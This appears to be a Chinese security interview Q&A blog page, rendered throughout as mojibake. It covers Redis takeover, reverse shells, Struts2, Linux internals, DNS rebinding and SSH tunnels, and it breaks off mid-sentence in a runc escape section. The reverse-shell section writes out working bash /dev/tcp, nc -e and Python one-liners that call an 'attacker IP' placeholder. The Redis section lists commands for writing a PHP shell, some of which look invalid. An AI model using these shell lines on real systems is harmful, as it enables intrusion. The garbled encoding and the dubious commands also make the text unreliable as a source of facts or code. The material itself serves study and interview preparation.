æ–¹æ³•ï¼Œç”¨äºå°†äºŒè¿›åˆ¶æ•°æ®è½¬æ¢ä¸ºç”±64ä¸ªå¯æ‰“å°å­—ç¬¦ç»„æˆçš„æ–‡æœ¬ï¼Œä¸»è¦ç”¨äºæ•°æ®çš„ä¼ è¾“å’Œå­˜å‚¨ã€‚MD5æ˜¯ä¸€ç§å“ˆå¸Œå‡½æ•°ï¼Œç”¨äºå°†ä»»æ„é•¿åº¦çš„æ•°æ®è½¬æ¢ä¸ºå›ºå®šé•¿åº¦çš„128ä½å“ˆå¸Œå€¼ï¼Œä¸»è¦ç”¨äºæ•°æ®å®Œæ•´æ€§å’Œèº«ä»½éªŒè¯ã€‚</p><h3 id="oracleçš„é»˜è®¤ç«¯å£æ˜¯å¤šå°‘"><a href="#oracleçš„é»˜è®¤ç«¯å£æ˜¯å¤šå°‘" class="headerlink" title="oracleçš„é»˜è®¤ç«¯å£æ˜¯å¤šå°‘"></a>oracleçš„é»˜è®¤ç«¯å£æ˜¯å¤šå°‘</h3><p>Oracleæ•°æ®åº“çš„é»˜è®¤ç«¯å£æ˜¯1521ã€‚</p><h3 id="mysqlçš„ç®¡ç†å‘˜å¯†ç ä¸€èˆ¬æ”¾åˆ°å“ª"><a href="#mysqlçš„ç®¡ç†å‘˜å¯†ç ä¸€èˆ¬æ”¾åˆ°å“ª" class="headerlink" title="mysqlçš„ç®¡ç†å‘˜å¯†ç ä¸€èˆ¬æ”¾åˆ°å“ª"></a>mysqlçš„ç®¡ç†å‘˜å¯†ç ä¸€èˆ¬æ”¾åˆ°å“ª</h3><p>MySQLçš„ç®¡ç†å‘˜å¯†ç é€šå¸¸å­˜å‚¨åœ¨<code>mysql</code>æ•°æ®åº“çš„<code>user</code>è¡¨ä¸­ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹SQLè¯­å¥æŸ¥è¯¢ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>, host, authentication_string <span class="keyword">FROM</span> mysql.user;</span><br></pre></td></tr></table></figure><h3 id="å¦‚æœsubstr-å‡½æ•°è¢«ç¦ç”¨ï¼Œä½ è„‘å­é‡Œæœ‰å¤šå°‘æ›¿æ¢å‡½æ•°"><a href="#å¦‚æœsubstr-å‡½æ•°è¢«ç¦ç”¨ï¼Œä½ è„‘å­é‡Œæœ‰å¤šå°‘æ›¿æ¢å‡½æ•°" class="headerlink" title="å¦‚æœsubstr()å‡½æ•°è¢«ç¦ç”¨ï¼Œä½ è„‘å­é‡Œæœ‰å¤šå°‘æ›¿æ¢å‡½æ•°"></a>å¦‚æœsubstr()å‡½æ•°è¢«ç¦ç”¨ï¼Œä½ è„‘å­é‡Œæœ‰å¤šå°‘æ›¿æ¢å‡½æ•°</h3><p>å¦‚æœ<code>substr()</code>å‡½æ•°è¢«ç¦ç”¨ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ›¿æ¢å‡½æ•°ï¼š</p><ul><li>**<code>mb_substr()</code>**ï¼šç”¨äºå¤šå­—èŠ‚å­—ç¬¦ä¸²çš„æˆªå–ã€‚</li><li>**<code>strcut()</code>**ï¼šè‡ªå®šä¹‰å‡½æ•°å®ç°å­—ç¬¦ä¸²æˆªå–ã€‚</li><li><strong>æ­£åˆ™è¡¨è¾¾å¼</strong>ï¼šä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å’Œæˆªå–å­—ç¬¦ä¸²ã€‚</li></ul><h3 id="rediså¦‚ä½•æ‹¿ä¸‹ï¼Œå“ªä¸ªç«¯å£ï¼Œå…·ä½“è¯­å¥ï¼Œå…·ä½“æ“ä½œ"><a href="#rediså¦‚ä½•æ‹¿ä¸‹ï¼Œå“ªä¸ªç«¯å£ï¼Œå…·ä½“è¯­å¥ï¼Œå…·ä½“æ“ä½œ" class="headerlink" title="rediså¦‚ä½•æ‹¿ä¸‹ï¼Œå“ªä¸ªç«¯å£ï¼Œå…·ä½“è¯­å¥ï¼Œå…·ä½“æ“ä½œ"></a>rediså¦‚ä½•æ‹¿ä¸‹ï¼Œå“ªä¸ªç«¯å£ï¼Œå…·ä½“è¯­å¥ï¼Œå…·ä½“æ“ä½œ</h3><p>Redisé»˜è®¤ç«¯å£æ˜¯6379ã€‚è¦æ‹¿ä¸‹Redisï¼Œå¯ä»¥å°è¯•ä»¥ä¸‹æ“ä½œï¼š</p><ol><li><strong>è¿æ¥åˆ°RedisæœåŠ¡å™¨</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h &lt;ç›®æ ‡IP&gt; -p 6379</span><br></pre></td></tr></table></figure></li><li><strong>å°è¯•è·å–æƒé™</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FLUSHALL</span><br><span class="line">CONFIG SET <span class="built_in">dir</span> /tmp</span><br><span class="line">CONFIG SET dbfilename shell.php</span><br><span class="line">SLAVEOF NO ONE</span><br><span class="line">DEBUG EXEC</span><br></pre></td></tr></table></figure>è¿™äº›å‘½ä»¤å¯ä»¥å°è¯•åœ¨RedisæœåŠ¡å™¨ä¸Šæ‰§è¡Œæ¶æ„æ“ä½œã€‚</li></ol><h3 id="å¦‚ä½•é€šè¿‡é‚®ç®±çŸ¥é“å¯¹æ–¹çš„IP"><a href="#å¦‚ä½•é€šè¿‡é‚®ç®±çŸ¥é“å¯¹æ–¹çš„IP" class="headerlink" title="å¦‚ä½•é€šè¿‡é‚®ç®±çŸ¥é“å¯¹æ–¹çš„IP"></a>å¦‚ä½•é€šè¿‡é‚®ç®±çŸ¥é“å¯¹æ–¹çš„IP</h3><p>é€šè¿‡é‚®ç®±è·å–å¯¹æ–¹çš„IPåœ°å€ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹é‚®ä»¶å¤´ä¿¡æ¯æ¥å®ç°ã€‚é‚®ä»¶å¤´ä¸­é€šå¸¸åŒ…å«å‘ä»¶äººçš„IPåœ°å€ç­‰ä¿¡æ¯ã€‚å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li><strong>è·å–é‚®ä»¶å¤´ä¿¡æ¯</strong>ï¼šåœ¨é‚®ä»¶å®¢æˆ·ç«¯ä¸­æŸ¥çœ‹é‚®ä»¶çš„å®Œæ•´å¤´ä¿¡æ¯ã€‚</li><li><strong>æŸ¥æ‰¾IPåœ°å€</strong>ï¼šåœ¨é‚®ä»¶å¤´ä¸­æŸ¥æ‰¾<code>Received</code>å­—æ®µï¼Œå…¶ä¸­é€šå¸¸åŒ…å«å‘ä»¶äººçš„IPåœ°å€ã€‚</li></ol><h3 id="Struct2æ¼æ´"><a href="#Struct2æ¼æ´" class="headerlink" title="Struct2æ¼æ´"></a>Struct2æ¼æ´</h3><p><a href="https://www.freebuf.com/vuls/283821.html">https://www.freebuf.com/vuls/283821.html</a></p><p>Struct2æ¼æ´ä¸»è¦æŒ‡çš„æ˜¯Apache Struts2æ¡†æ¶ä¸­å­˜åœ¨çš„ä¸€äº›å®‰å…¨æ¼æ´ï¼Œå…¶ä¸­æœ€è‘—åçš„æ˜¯è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¿™äº›æ¼æ´é€šå¸¸ç”±äºæ¡†æ¶åœ¨å¤„ç†ç”¨æˆ·è¾“å…¥æ—¶ä½¿ç”¨äº†OGNLï¼ˆObject-Graph Navigation Languageï¼‰è¡¨è¾¾å¼ï¼Œè€Œç”¨æˆ·è¾“å…¥è¢«ä¸å½“æ‹¼æ¥åˆ°äº†OGNLè¡¨è¾¾å¼ä¸­ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„URLæˆ–å‚æ•°æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h3 id="çˆ¶å­è¿›ç¨‹çš„ä»‹ç»"><a href="#çˆ¶å­è¿›ç¨‹çš„ä»‹ç»" class="headerlink" title="çˆ¶å­è¿›ç¨‹çš„ä»‹ç»"></a>çˆ¶å­è¿›ç¨‹çš„ä»‹ç»</h3><p>åœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œè¿›ç¨‹å¯ä»¥é€šè¿‡<code>fork()</code>ç³»ç»Ÿè°ƒç”¨åˆ›å»ºå­è¿›ç¨‹ã€‚çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ä¹‹é—´å­˜åœ¨ä¸€å®šçš„å…³ç³»ï¼š</p><ul><li>çˆ¶è¿›ç¨‹åˆ›å»ºå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹ä»çˆ¶è¿›ç¨‹ç»§æ‰¿å¤§éƒ¨åˆ†å±æ€§ï¼Œä½†æ‹¥æœ‰ç‹¬ç«‹çš„è¿›ç¨‹IDã€‚</li><li>çˆ¶è¿›ç¨‹å¯ä»¥é€šè¿‡æŸäº›æœºåˆ¶ï¼ˆå¦‚<code>wait()</code>æˆ–<code>waitpid()</code>ï¼‰æ¥ç­‰å¾…å­è¿›ç¨‹çš„ç»“æŸã€‚</li><li>å­è¿›ç¨‹å¯ä»¥ç‹¬ç«‹äºçˆ¶è¿›ç¨‹è¿è¡Œï¼Œæ‹¥æœ‰è‡ªå·±çš„å†…å­˜ç©ºé—´å’Œç³»ç»Ÿèµ„æºã€‚</li></ul><h3 id="å­¤å„¿è¿›ç¨‹å’Œåƒµå°¸è¿›ç¨‹"><a href="#å­¤å„¿è¿›ç¨‹å’Œåƒµå°¸è¿›ç¨‹" class="headerlink" title="å­¤å„¿è¿›ç¨‹å’Œåƒµå°¸è¿›ç¨‹"></a>å­¤å„¿è¿›ç¨‹å’Œåƒµå°¸è¿›ç¨‹</h3><ul><li><strong>å­¤å„¿è¿›ç¨‹</strong>ï¼šå½“çˆ¶è¿›ç¨‹åœ¨å­è¿›ç¨‹ç»“æŸä¹‹å‰é€€å‡ºæ—¶ï¼Œå­è¿›ç¨‹æˆä¸ºå­¤å„¿è¿›ç¨‹ã€‚å­¤å„¿è¿›ç¨‹ä¼šè¢«<code>init</code>è¿›ç¨‹ï¼ˆPIDä¸º1ï¼‰æ”¶å…»ï¼Œ<code>init</code>è¿›ç¨‹ä¼šè´Ÿè´£æ¸…ç†å­¤å„¿è¿›ç¨‹çš„èµ„æºã€‚</li><li><strong>åƒµå°¸è¿›ç¨‹</strong>ï¼šå½“å­è¿›ç¨‹ç»“æŸä½†çˆ¶è¿›ç¨‹å°šæœªå›æ”¶å…¶èµ„æºï¼ˆå¦‚æœªè°ƒç”¨<code>wait()</code>æˆ–<code>waitpid()</code>ï¼‰æ—¶ï¼Œå­è¿›ç¨‹ä¼šå¤„äºåƒµå°¸çŠ¶æ€ã€‚åƒµå°¸è¿›ç¨‹ä»ç„¶å ç”¨ç³»ç»Ÿèµ„æºï¼Œå¯èƒ½å¯¼è‡´ç³»ç»Ÿæ€§èƒ½ä¸‹é™ã€‚</li></ul><h3 id="åå¼¹shellçš„å‡ ç§æ–¹å¼"><a href="#åå¼¹shellçš„å‡ ç§æ–¹å¼" class="headerlink" title="åå¼¹shellçš„å‡ ç§æ–¹å¼"></a>åå¼¹shellçš„å‡ ç§æ–¹å¼</h3><p>åå¼¹shellæ˜¯ä¸€ç§ç½‘ç»œå®‰å…¨æŠ€æœ¯ï¼Œæ”»å‡»è€…é€šè¿‡åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œä½¿ç›®æ ‡ç³»ç»Ÿä¸»åŠ¨è¿æ¥åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œä»è€Œè·å¾—ç›®æ ‡ç³»ç»Ÿçš„æ§åˆ¶æƒã€‚å¸¸è§çš„åå¼¹shellæ–¹å¼åŒ…æ‹¬ï¼š</p><ul><li>ä½¿ç”¨<code>bash</code>æˆ–<code>sh</code>ï¼š<code>bash -i &gt;&amp; /dev/tcp/æ”»å‡»è€…IP/ç«¯å£ 0&gt;&amp;1</code></li><li>ä½¿ç”¨<code>nc</code>ï¼ˆNetcatï¼‰ï¼š<code>nc -e /bin/sh æ”»å‡»è€…IP ç«¯å£</code></li><li>ä½¿ç”¨<code>python</code>ï¼š<code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;æ”»å‡»è€…IP&quot;,ç«¯å£));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></li></ul><h3 id="Linuxå¼€æœºè‡ªå¯åŠ¨æ–¹å¼"><a href="#Linuxå¼€æœºè‡ªå¯åŠ¨æ–¹å¼" class="headerlink" title="Linuxå¼€æœºè‡ªå¯åŠ¨æ–¹å¼"></a>Linuxå¼€æœºè‡ªå¯åŠ¨æ–¹å¼</h3><p>Linuxç³»ç»Ÿæœ‰å¤šç§å¼€æœºè‡ªå¯åŠ¨æ–¹å¼ï¼š</p><ul><li>**<code>/etc/rc.local</code>**ï¼šåœ¨è¯¥è„šæœ¬ä¸­æ·»åŠ éœ€è¦å¼€æœºè‡ªå¯åŠ¨çš„å‘½ä»¤æˆ–è„šæœ¬ã€‚</li><li><strong><code>/etc/init.d/</code>è„šæœ¬</strong>ï¼šåˆ›å»ºå¯åŠ¨è„šæœ¬å¹¶å°†å…¶é“¾æ¥åˆ°ç›¸åº”çš„è¿è¡Œçº§åˆ«ç›®å½•ã€‚</li><li><strong><code>systemd</code>æœåŠ¡</strong>ï¼šé€šè¿‡åˆ›å»º<code>.service</code>æ–‡ä»¶å¹¶å¯ç”¨æœåŠ¡æ¥å®ç°å¼€æœºè‡ªå¯åŠ¨ã€‚</li></ul><h3 id="init-dè„šæœ¬ä»‹ç»"><a href="#init-dè„šæœ¬ä»‹ç»" class="headerlink" title="init.dè„šæœ¬ä»‹ç»"></a>init.dè„šæœ¬ä»‹ç»</h3><p><code>/etc/init.d/</code>ç›®å½•ä¸­çš„è„šæœ¬ç”¨äºç®¡ç†æœåŠ¡çš„å¯åŠ¨ã€åœæ­¢å’Œé‡å¯ã€‚è¿™äº›è„šæœ¬é€šå¸¸éœ€è¦æ”¯æŒä»¥ä¸‹å‚æ•°ï¼š</p><ul><li><code>start</code>ï¼šå¯åŠ¨æœåŠ¡</li><li><code>stop</code>ï¼šåœæ­¢æœåŠ¡</li><li><code>restart</code>ï¼šé‡å¯æœåŠ¡</li><li><code>status</code>ï¼šæŸ¥çœ‹æœåŠ¡çŠ¶æ€</li></ul><h3 id="Linuxæ€ä¹ˆæŸ¥çœ‹ç¨‹åºè°ƒç”¨äº†å“ªäº›æ–‡ä»¶"><a href="#Linuxæ€ä¹ˆæŸ¥çœ‹ç¨‹åºè°ƒç”¨äº†å“ªäº›æ–‡ä»¶" class="headerlink" title="Linuxæ€ä¹ˆæŸ¥çœ‹ç¨‹åºè°ƒç”¨äº†å“ªäº›æ–‡ä»¶"></a>Linuxæ€ä¹ˆæŸ¥çœ‹ç¨‹åºè°ƒç”¨äº†å“ªäº›æ–‡ä»¶</h3><p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ç¨‹åºè°ƒç”¨äº†å“ªäº›æ–‡ä»¶ï¼š</p><ul><li>**<code>lsof</code>**ï¼šåˆ—å‡ºå½“å‰ç³»ç»Ÿä¸­æ‰“å¼€çš„æ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…æ‹¬è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶ã€‚<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -p &lt;è¿›ç¨‹ID&gt;</span><br></pre></td></tr></table></figure></li><li>**<code>strace</code>**ï¼šè·Ÿè¸ªç³»ç»Ÿè°ƒç”¨å’Œä¿¡å·ï¼Œå¯ä»¥æŸ¥çœ‹ç¨‹åºè®¿é—®çš„æ–‡ä»¶ã€‚<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -e trace=file -p &lt;è¿›ç¨‹ID&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="å¦‚ä½•ç›‘æ§Linuxæ–‡ä»¶æ“ä½œ"><a href="#å¦‚ä½•ç›‘æ§Linuxæ–‡ä»¶æ“ä½œ" class="headerlink" title="å¦‚ä½•ç›‘æ§Linuxæ–‡ä»¶æ“ä½œ"></a>å¦‚ä½•ç›‘æ§Linuxæ–‡ä»¶æ“ä½œ</h3><p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å·¥å…·ç›‘æ§Linuxæ–‡ä»¶æ“ä½œï¼š</p><ul><li>**<code>inotify</code>**ï¼šä¸€ä¸ªæ–‡ä»¶å˜åŒ–äº‹ä»¶ç›‘æ§å·¥å…·ï¼Œå¯ä»¥å®æ—¶ç›‘æ§æ–‡ä»¶æˆ–ç›®å½•çš„å˜åŒ–ã€‚</li><li>**<code>auditd</code>**ï¼šå®¡è®¡å®ˆæŠ¤è¿›ç¨‹ï¼Œå¯ä»¥è®°å½•ç³»ç»Ÿè°ƒç”¨å’Œæ–‡ä»¶è®¿é—®ç­‰ä¿¡æ¯ã€‚</li></ul><h3 id="Linuxæœ‰å“ªäº›ç³»ç»Ÿè°ƒç”¨"><a href="#Linuxæœ‰å“ªäº›ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="Linuxæœ‰å“ªäº›ç³»ç»Ÿè°ƒç”¨"></a>Linuxæœ‰å“ªäº›ç³»ç»Ÿè°ƒç”¨</h3><p>Linuxç³»ç»Ÿè°ƒç”¨æ˜¯ç”¨æˆ·ç¨‹åºä¸æ“ä½œç³»ç»Ÿå†…æ ¸ä¹‹é—´çš„æ¥å£ï¼Œå¸¸è§çš„ç³»ç»Ÿè°ƒç”¨åŒ…æ‹¬ï¼š</p><ul><li>**<code>open()</code>**ï¼šæ‰“å¼€æ–‡ä»¶</li><li>**<code>read()</code>**ï¼šè¯»å–æ–‡ä»¶</li><li>**<code>write()</code>**ï¼šå†™å…¥æ–‡ä»¶</li><li>**<code>close()</code>**ï¼šå…³é—­æ–‡ä»¶</li><li>**<code>fork()</code>**ï¼šåˆ›å»ºå­è¿›ç¨‹</li><li>**<code>exec()</code>**ï¼šæ‰§è¡Œç¨‹åº</li><li>**<code>wait()</code>**ï¼šç­‰å¾…å­è¿›ç¨‹ç»“æŸ</li></ul><h3 id="æŸ¥çœ‹Linuxå¼€æ”¾çš„ç½‘ç»œç«¯å£"><a href="#æŸ¥çœ‹Linuxå¼€æ”¾çš„ç½‘ç»œç«¯å£" class="headerlink" title="æŸ¥çœ‹Linuxå¼€æ”¾çš„ç½‘ç»œç«¯å£"></a>æŸ¥çœ‹Linuxå¼€æ”¾çš„ç½‘ç»œç«¯å£</h3><p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹Linuxç³»ç»Ÿä¸­å¼€æ”¾çš„ç½‘ç»œç«¯å£ï¼š</p><ul><li><code>netstat</code>å‘½ä»¤ï¼š<code>netstat -tuln</code>ï¼Œå…¶ä¸­<code>-t</code>è¡¨ç¤ºæ˜¾ç¤ºTCPç«¯å£ï¼Œ<code>-u</code>è¡¨ç¤ºæ˜¾ç¤ºUDPç«¯å£ï¼Œ<code>-l</code>è¡¨ç¤ºåªæ˜¾ç¤ºç›‘å¬çŠ¶æ€çš„ç«¯å£ï¼Œ<code>-n</code>è¡¨ç¤ºä»¥æ•°å­—å½¢å¼æ˜¾ç¤ºç«¯å£å·ã€‚</li><li><code>ss</code>å‘½ä»¤ï¼š<code>ss -tuln</code>ï¼Œ<code>ss</code>æ˜¯<code>netstat</code>çš„æ›¿ä»£å·¥å…·ï¼Œå¯ä»¥æ›´å¿«é€Ÿå’Œé«˜æ•ˆåœ°æ˜¾ç¤ºç½‘ç»œç«¯å£ä¿¡æ¯ã€‚</li><li><code>lsof</code>å‘½ä»¤ï¼š<code>lsof -i</code>ï¼Œå¯ä»¥æŸ¥çœ‹æŒ‡å®šç«¯å£å·çš„ç›¸å…³ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¿›ç¨‹IDã€è¿›ç¨‹å‘½ä»¤ç­‰ã€‚</li></ul><h3 id="æŸ¥çœ‹Linuxå¤šçº¿ç¨‹çŠ¶æ€"><a href="#æŸ¥çœ‹Linuxå¤šçº¿ç¨‹çŠ¶æ€" class="headerlink" title="æŸ¥çœ‹Linuxå¤šçº¿ç¨‹çŠ¶æ€"></a>æŸ¥çœ‹Linuxå¤šçº¿ç¨‹çŠ¶æ€</h3><p>å¯ä»¥ä½¿ç”¨<code>top</code>æˆ–<code>htop</code>å‘½ä»¤æ¥æŸ¥çœ‹Linuxç³»ç»Ÿä¸­çš„å¤šçº¿ç¨‹çŠ¶æ€ã€‚<code>top</code>å‘½ä»¤æä¾›äº†å¯¹ç³»ç»Ÿèµ„æºä½¿ç”¨æƒ…å†µçš„å®æ—¶è§†å›¾ï¼Œé€šè¿‡æŒ‰<code>H</code>é”®å¯ä»¥åˆ‡æ¢åˆ°çº¿ç¨‹è§†å›¾æ¨¡å¼ï¼Œæ˜¾ç¤ºæ¯ä¸ªçº¿ç¨‹çš„è¯¦ç»†ä¿¡æ¯ã€‚</p><h3 id="Linuxä¸‹éšè—æ–‡ä»¶"><a href="#Linuxä¸‹éšè—æ–‡ä»¶" class="headerlink" title="Linuxä¸‹éšè—æ–‡ä»¶"></a>Linuxä¸‹éšè—æ–‡ä»¶</h3><p>åœ¨Linuxç³»ç»Ÿä¸­ï¼Œå¯ä»¥é€šè¿‡åœ¨æ–‡ä»¶åå‰æ·»åŠ ä¸€ä¸ª<code>.</code>æ¥éšè—æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨<code>mv test.txt .test.txt</code>å‘½ä»¤å¯ä»¥å°†<code>test.txt</code>æ–‡ä»¶éšè—ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨<code>chattr</code>å‘½ä»¤æ¥è®¾ç½®æ–‡ä»¶çš„éšè—å±æ€§ã€‚</p><h3 id="å­åŸŸåæ”¶é›†"><a href="#å­åŸŸåæ”¶é›†" class="headerlink" title="å­åŸŸåæ”¶é›†"></a>å­åŸŸåæ”¶é›†</h3><p>å­åŸŸåæ”¶é›†æ˜¯ç½‘ç»œå®‰å…¨å’Œæ¸—é€æµ‹è¯•ä¸­çš„ä¸€ä¸ªé‡è¦ç¯èŠ‚ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å·¥å…·å’Œæ–¹æ³•ï¼š</p><ul><li><strong>Sublist3r</strong>ï¼šä¸€ä¸ªå¼€æºçš„å­åŸŸåæ”¶é›†å·¥å…·ï¼Œæ”¯æŒå¤šçº¿ç¨‹å’Œå¤šç§DNSæŸ¥è¯¢æ–¹æ³•ã€‚</li><li><strong>Amass</strong>ï¼šä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„èµ„äº§æ”¶é›†å·¥å…·ï¼Œå¯ä»¥æ”¶é›†å­åŸŸåã€IPåœ°å€ç­‰ä¿¡æ¯ã€‚</li><li><strong>DNSæšä¸¾</strong>ï¼šé€šè¿‡æŸ¥è¯¢DNSæœåŠ¡å™¨æ¥è·å–å­åŸŸåä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨<code>dig</code>ç­‰å·¥å…·è¿›è¡ŒæŸ¥è¯¢ã€‚</li></ul><h3 id="DNSé‡ç»‘å®š"><a href="#DNSé‡ç»‘å®š" class="headerlink" title="DNSé‡ç»‘å®š"></a>DNSé‡ç»‘å®š</h3><p>DNSé‡ç»‘å®šæ˜¯ä¸€ç§ç½‘ç»œå®‰å…¨æŠ€æœ¯ï¼Œæ”»å‡»è€…é€šè¿‡åŠ¨æ€æ›´æ–°DNSè®°å½•ï¼Œä½¿å—å®³è€…åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è®¿é—®æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨ã€‚é˜²å¾¡DNSé‡ç»‘å®šçš„æ–¹æ³•åŒ…æ‹¬ï¼š</p><ul><li>ä½¿ç”¨HTTPSå’ŒHSTSæ¥ç¡®ä¿è¿æ¥çš„å®‰å…¨æ€§ã€‚</li><li>å¯¹DNSè®°å½•è¿›è¡Œä¸¥æ ¼éªŒè¯ï¼Œç¡®ä¿å…¶æ¥æºå¯é ã€‚</li><li>ä½¿ç”¨å®‰å…¨çš„DNSè§£ææœåŠ¡ï¼Œé¿å…ä½¿ç”¨å…¬å…±DNSæœåŠ¡å™¨ã€‚</li></ul><h3 id="DNSè§£æçš„æµç¨‹"><a href="#DNSè§£æçš„æµç¨‹" class="headerlink" title="DNSè§£æçš„æµç¨‹"></a>DNSè§£æçš„æµç¨‹</h3><p>DNSè§£æçš„æµç¨‹é€šå¸¸åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li><strong>æœ¬åœ°DNSç¼“å­˜æŸ¥æ‰¾</strong>ï¼šæµè§ˆå™¨æˆ–åº”ç”¨ç¨‹åºé¦–å…ˆæ£€æŸ¥æœ¬åœ°DNSç¼“å­˜ä¸­æ˜¯å¦æœ‰ç›®æ ‡åŸŸåçš„è§£æè®°å½•ã€‚</li><li><strong>é€’å½’æŸ¥è¯¢</strong>ï¼šå¦‚æœæœ¬åœ°ç¼“å­˜ä¸­æ²¡æœ‰è§£æè®°å½•ï¼Œè¯·æ±‚ä¼šè¢«å‘é€åˆ°æœ¬åœ°DNSæœåŠ¡å™¨ï¼Œæœ¬åœ°DNSæœåŠ¡å™¨ä¼šè¿›è¡Œé€’å½’æŸ¥è¯¢ï¼Œä¾æ¬¡å‘æ ¹DNSæœåŠ¡å™¨ã€é¡¶çº§åŸŸåæœåŠ¡å™¨å’Œæƒå¨DNSæœåŠ¡å™¨æŸ¥è¯¢ï¼Œç›´åˆ°è·å–åˆ°ç›®æ ‡åŸŸåçš„è§£æç»“æœã€‚</li><li><strong>ç¼“å­˜æ›´æ–°</strong>ï¼šè·å–åˆ°è§£æç»“æœåï¼Œæœ¬åœ°DNSæœåŠ¡å™¨ä¼šå°†ç»“æœç¼“å­˜ï¼Œä»¥ä¾¿åç»­çš„æŸ¥è¯¢å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚</li></ol><h3 id="CCæµé‡"><a href="#CCæµé‡" class="headerlink" title="CCæµé‡"></a>CCæµé‡</h3><p>CCï¼ˆChallenge Collapsarï¼‰æµé‡é€šå¸¸æŒ‡çš„æ˜¯ä¸€ç§DDoSæ”»å‡»æ–¹å¼ï¼Œé€šè¿‡æ¨¡æ‹Ÿå¤§é‡æ­£å¸¸ç”¨æˆ·è¯·æ±‚æ¥æ¶ˆè€—ç›®æ ‡æœåŠ¡å™¨çš„èµ„æºã€‚é˜²å¾¡CCæ”»å‡»çš„æ–¹æ³•åŒ…æ‹¬ï¼š</p><ul><li>ä½¿ç”¨CDNæœåŠ¡æ¥åˆ†æ•£æµé‡ã€‚</li><li>é…ç½®é˜²ç«å¢™å’ŒWAFï¼ˆWebåº”ç”¨é˜²ç«å¢™ï¼‰æ¥è¿‡æ»¤æ¶æ„æµé‡ã€‚</li><li>é™åˆ¶å•ä¸ªIPçš„è¯·æ±‚é¢‘ç‡ï¼Œè®¾ç½®è®¿é—®é€Ÿç‡é™åˆ¶ã€‚</li></ul><h3 id="SSHéš§é“"><a href="#SSHéš§é“" class="headerlink" title="SSHéš§é“"></a>SSHéš§é“</h3><p>SSHéš§é“æ˜¯ä¸€ç§é€šè¿‡SSHåè®®åˆ›å»ºçš„å®‰å…¨ç½‘ç»œé€šé“ï¼Œå¯ä»¥ç”¨äºåŠ å¯†æ•°æ®ä¼ è¾“ã€ç«¯å£è½¬å‘ç­‰ã€‚åˆ›å»ºSSHéš§é“çš„åŸºæœ¬å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L æœ¬åœ°ç«¯å£:ç›®æ ‡ä¸»æœº:ç›®æ ‡ç«¯å£ ç”¨æˆ·å@è¿œç¨‹ä¸»æœº</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼Œè¦å°†æœ¬åœ°çš„<code>8080</code>ç«¯å£è½¬å‘åˆ°è¿œç¨‹ä¸»æœºçš„<code>80</code>ç«¯å£ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8080:localhost:80 ç”¨æˆ·å@è¿œç¨‹ä¸»æœº</span><br></pre></td></tr></table></figure><h3 id="runcå®¹å™¨é€ƒé€¸åŸç†"><a href="#runcå®¹å™¨é€ƒé€¸åŸç†" class="headerlink" title="runcå®¹å™¨é€ƒé€¸åŸç†"></a>runcå®¹å™¨é€ƒé€¸åŸç†</h3><p>runcå®¹å™¨é€ƒé€¸é€šå¸¸åˆ©ç”¨å®¹å™¨è¿è¡Œæ—¶çš„æ¼æ´æ¥çªç 